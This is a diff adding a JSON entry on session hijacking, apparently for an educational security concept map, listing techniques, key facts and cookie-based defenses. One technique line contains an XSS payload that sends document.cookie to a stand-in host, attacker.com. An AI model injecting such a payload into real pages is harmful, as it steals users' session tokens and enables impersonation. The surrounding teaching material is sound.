@@ -1,0 +1,37 @@
+{
+  "id": "session-hijacking",
+  "title": "Session Hijacking",
+  "shortName": "Session Hijack",
+  "type": "attack",
+  "osiLayer": 7,
+  "category": "web_attack",
+  "severity": "high",
+  "description": "Stealing or forging a user's session token to impersonate them without knowing their password.",
+  "fullExplanation": "Web applications use session tokens (cookies) to identify authenticated users. If an attacker obtains a valid session token, they can impersonate that user without needing their password. Tokens can be stolen via XSS (document.cookie), network sniffing (HTTP), MITM, or predicted if generated insecurely. Session fixation forces a victim to use an attacker-known session ID.",
+  "techniques": [
+    { "name": "XSS Cookie Theft", "description": "Inject script: document.location='http://attacker.com?c='+document.cookie" },
+    { "name": "Network Sniffing", "description": "Capture session cookie over unencrypted HTTP on same network" },
+    { "name": "Session Fixation", "description": "Force victim to use attacker-known session ID before authentication" },
+    { "name": "Cross-Site Cooking", "description": "Exploit cookie scope to inject cookies for other subdomains" },
+    { "name": "Token Prediction", "description": "Weak random number generator — predict valid session IDs" }
+  ],
+  "keyFacts": [
+    "HttpOnly flag prevents JavaScript from reading cookies — stops XSS theft",
+    "Secure flag ensures cookie only sent over HTTPS",
+    "SameSite=Strict prevents cookie from being sent in cross-site requests",
+    "Regenerate session ID after login — prevents session fixation",
+    "Short session timeouts limit window of opportunity",
+    "Bind session to IP/User-Agent — detect token reuse from different context",
+    "JWT tokens: verify signature, check expiry, use short-lived tokens"
+  ],
+  "defenses": [
+    { "name": "HttpOnly + Secure Cookies", "description": "HttpOnly blocks JS access; Secure ensures HTTPS-only transmission" },
+    { "name": "SameSite Cookie", "description": "Prevent cross-site cookie submission" },
+    { "name": "HTTPS Everywhere", "description": "Encrypt all traffic — prevent network sniffing" },
+    { "name": "Session Regeneration", "description": "Issue new session ID after login — prevent fixation" },
+    { "name": "Short Session Timeout", "description": "Expire sessions after inactivity — limit hijacking window" }
+  ],
+  "parent": "attacks",
+  "relatedConcepts": ["xss", "csrf", "mitm", "https"],
+  "visualization": { "color": "#ff3366", "icon": "🎭", "nodeType": "leaf" }
+}
